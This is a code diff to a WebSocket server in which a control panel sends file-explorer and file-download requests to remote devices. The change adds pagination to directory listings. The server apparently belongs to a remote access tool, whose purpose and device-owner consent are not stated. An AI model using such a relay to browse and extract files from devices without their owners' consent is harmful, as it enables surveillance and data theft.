@@ -157,22 +157,24 @@ wss.on("connection", (ws, req) => {
 
             // Panel requested file explorer action
             if (data.type === "fileExplorer") {
-                const { targetId, action, path } = data;
-                const device = devices.get(targetId);
-                if (
-                    device &&
-                    device.ws &&
-                    device.ws.readyState === WebSocket.OPEN
-                ) {
-                    device.ws.send(
-                        JSON.stringify({
-                            type: "fileExplorer",
-                            action: action,
-                            path: path
-                        })
-                    );
-                }
-            }
+    const { targetId, action, path } = data;
+    // Add pagination parameters if they exist
+    const page = data.page || 1;
+    const pageSize = data.pageSize || 50;
+    
+    const device = devices.get(targetId);
+    if (device && device.ws && device.ws.readyState === WebSocket.OPEN) {
+        device.ws.send(
+            JSON.stringify({
+                type: "fileExplorer",
+                action: action,
+                path: path,
+                page: page,
+                pageSize: pageSize
+            })
+        );
+    }
+}
 
             // Panel requested file/folder download
             if (data.type === "fileDownload") {
